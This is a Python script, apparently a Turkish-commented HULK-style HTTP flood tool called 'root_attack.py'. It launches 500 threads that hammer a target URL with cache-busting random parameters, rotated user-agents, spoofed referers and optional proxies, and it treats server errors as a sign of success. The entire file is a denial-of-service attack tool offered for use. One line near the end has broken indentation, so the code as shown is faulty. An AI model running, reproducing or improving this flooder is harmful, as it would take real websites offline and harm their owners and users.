#      #########################################
       # Author : Dohela                       #
       # Site   : https://dohela.com           #
       # Date   : 5 - 3 - 2020                 #
       # Github : https://github.com/dohelax   #
       #########################################


import urllib.request
import sys
import threading
import random
import re
import time

# Global değişkenler
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
proxies = []

# İstek sayaçlarını artırır
def inc_counter():
    global request_counter
    request_counter += 1

# Bayrak ayarlayıcı
def set_flag(val):
    global flag
    flag = val

# Güvenli moda geçiş
def set_safe():
    global safe
    safe = 1

# User-agent listesi oluşturur
def useragent_list():
    global headers_useragents
    headers_useragents = [
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ]
    return headers_useragents

# Referer listesi oluşturur
def referer_list():
    global headers_referers
    headers_referers = [
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://' + host + '/'
    ]
    return headers_referers

# Proxy listesi oluşturur
def load_proxies():
    global proxies
    proxies = [
        'http://127.0.0.1:8080',
        # Buraya proxy ekleyin
    ]

# Rastgele bir ASCII bloğu oluşturur
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

# Kullanım talimatları
def usage():
    print('---------------------------------------------------')
    print('USAGE: python root_attack.py <url> [safe]')
    print('You can add "safe" after the URL to stop automatically after DoS')
    print('---------------------------------------------------')

# Proxy ile HTTP isteği oluşturur
def httpcall(url):
    useragent_list()
    referer_list()
    code = 0

    if "?" in url:
        param_joiner = "&"
    else:
        param_joiner = "?"

    request_url = url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))

    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': random.choice(headers_referers) + buildblock(random.randint(5, 10)),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'close',  # Bağlantıyı sürekli kapatıp tekrar açar
        'Host': host
    }

    # Proxy seçimi (varsa)
    if proxies:
        proxy = random.choice(proxies)
        proxy_handler = urllib.request.ProxyHandler({'http': proxy, 'https': proxy})
        opener = urllib.request.build_opener(proxy_handler)
        urllib.request.install_opener(opener)

    request = urllib.request.Request(request_url, headers=headers)

    try:
        response = urllib.request.urlopen(request)
        inc_counter()
        print(f"Request sent! Status: {response.status}")
    except urllib.error.HTTPError as e:
        set_flag(1)
        print(f'HTTP Error {e.code}: Attack might be working.')
        code = 500
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
        sys.exit()

    return code

# HTTP thread sınıfı
class HTTPThread(threading.Thread):
    def run(self):
        while flag < 2:
            code = httpcall(url)
            if code == 500 and safe == 1:
                set_flag(2)

# Monitör thread sınıfı
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- Attack Finished --")

# Çalıştırma
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- Root Attack Başlatıldı By Dohela --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
                if url.count("/") == 2:
            url += "/"
        
        # URL'den ana makineyi çıkarır
        m = re.search(r'http://([^/]*)/?.*', url)
        if m:
            host = m.group(1)
        else:
            print("URL'den ana makine alınamadı. Lütfen URL'yi kontrol edin.")
            sys.exit()

        # Proxies yükleniyor (varsayılan olarak boşsa)
        load_proxies()

        # HTTP thread'leri başlat
        for i in range(500):  # Thread sayısını ihtiyaca göre ayarlayın
            t = HTTPThread()
            t.start()
        
        # Monitör thread'ini başlat
        t = MonitorThread()
        t.start()

